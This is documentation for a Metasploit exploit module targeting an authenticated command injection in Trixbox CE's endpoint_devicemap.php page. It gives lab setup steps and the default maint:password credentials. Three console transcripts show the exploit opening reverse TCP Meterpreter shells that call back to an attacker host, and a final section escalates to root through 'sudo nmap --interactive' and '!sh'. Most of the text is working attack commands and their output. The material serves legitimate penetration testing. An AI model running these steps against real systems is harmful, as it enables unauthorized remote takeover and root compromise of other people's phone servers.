## Vulnerable Application

### Description

  This module exploits an authenticated OS command injection
  vulnerability found in Trixbox CE version 1.2.0 to 2.8.0.4
  inclusive in the "network" POST parameter of the
  "/maint/modules/endpointcfg/endpoint_devicemap.php" page.
  Successful exploitation allows for arbitrary command execution
  on the underlying operating system as the "asterisk" user.
  Users can easily elevate their privileges to the "root" user
  however by executing "sudo nmap --interactive" followed by "!sh"
  from within nmap.

### Installation And Setup

  1. Download the latest version of Trixbox CE (i.e. [v2.8.0.4 ISO](https://netcologne.dl.sourceforge.net/project/asteriskathome/trixbox%20CE/trixbox%202.8/trixbox-2.8.0.4.iso)).
  2. Set up a new CentOS machine in VirtualBox or VMWare and load the ISO. 
  Be sure to disable any autosetup features of VMWare or VirtualBox. 
  Follow the install prompts and note the `root` password you choose to use. 
  Once `Package Installation` appears on the screen, wait for the system 
  to finish rebooting several times, after which the following screen 
  should be displayed:
  ```
  CentOS release 4.3 (Final)
  Kernel 2.6.9-34.EL on an i686

  asterisk1 login:
  ```
  3. Log into via the terminal using the username `root` and the password 
  you set for the `root` user during installation.
  4. A prompt similar to the following should be displayed:
  ```
  For access to the trixbox web GUI use this URL: http://192.168.205.144
  ```
  5. Once this prompt is displayed, take the IP address and browse 
  to the URL http://*IP ADDRESS*/maint/, then log in with the default 
  administrative credentials (`maint`:`password`).

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Scenarios

### Trixbox CE v2.8.0.4
```
msf5 > use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set rhosts 192.168.1.8
rhosts => 192.168.1.8
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options

Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  password         yes       Password to login with
   HttpUsername  maint            yes       User to login with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.8      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Linux Dropper)


msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set lhost 192.168.1.10
lhost => 192.168.1.10
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] 192.168.1.8:80 - Authenticating using "maint:password" credentials...
[+] 192.168.1.8:80 - Authenticated successfully.
[+] 192.168.1.8:80 - Trixbox CE v2.8.0.4 identified.
[*] 192.168.1.8:80 - Sending payload (150 bytes)...
[*] Sending stage (980808 bytes) to 192.168.1.8
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.8:38680) at 2020-05-02 03:55:24 -0400
[*] Command Stager progress - 100.00% done (799/799 bytes)

meterpreter > sysinfo
Computer     : trixbox1.localdomain
OS           : CentOS 5.5 (Linux 2.6.18-164.11.1.el5)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 9259 created.
Channel 1 created.
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
whoami
asterisk
```

### Trixbox CE v2.4.0
```
msf5 > use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set rhosts 192.168.1.7
rhosts => 192.168.1.7
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options

Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  password         yes       Password to login with
   HttpUsername  maint            yes       User to login with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.7      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Linux Dropper)


msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set lhost 192.168.1.10
lhost => 192.168.1.10
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] 192.168.1.7:80 - Authenticating using "maint:password" credentials...
[+] 192.168.1.7:80 - Authenticated successfully.
[+] 192.168.1.7:80 - Trixbox CE v2.4.0 identified.
[*] 192.168.1.7:80 - Sending payload (150 bytes)...
[*] Sending stage (980808 bytes) to 192.168.1.7
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.7:4478) at 2020-05-02 03:52:53 -0400
[*] Command Stager progress - 100.00% done (799/799 bytes)

meterpreter > sysinfo
Computer     : trixbox1.localdomain
OS           : CentOS 5 (Linux 2.6.18-53.1.4.el5)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 14144 created.
Channel 1 created.
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
whoami
asterisk
```

### Trixbox CE v1.2.0
```
msf5 > use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce 
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options

Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  password         yes       Password to login with
   HttpUsername  maint            yes       User to login with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Linux Dropper)


msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set LHOST 192.168.205.1
LHOST => 192.168.205.1
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set SRVHOST 192.168.205.1
SRVHOST => 192.168.205.1
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.148
RHOSTS => 192.168.205.148
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit

[*] Started reverse TCP handler on 192.168.205.1:4444 
[*] 192.168.205.148:80 - Authenticating using "maint:password" credentials...
[+] 192.168.205.148:80 - Authenticated successfully.
[+] 192.168.205.148:80 - Trixbox CE v1.2.0 identified.
[*] 192.168.205.148:80 - Sending payload (150 bytes)...
[*] Sending stage (980808 bytes) to 192.168.205.148
[*] Meterpreter session 1 opened (192.168.205.1:4444 -> 192.168.205.148:32775) at 2020-05-04 12:53:23 -0500
[*] Command Stager progress - 100.00% done (799/799 bytes)

meterpreter > sysinfo
Computer     : asterisk1.local
OS           : CentOS 4.4 (Linux 2.6.9-42.0.2.EL)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 5678 created.
Channel 1 created.
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
whoami
asterisk
```

## Privilege Elevation Steps

  Once a shell has been gained as the `asterisk` user, 
  attackers can elevate their privileges to `root` by 
  executing the following commands:

```
sudo nmap --interactive

Starting Nmap V. 4.76 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

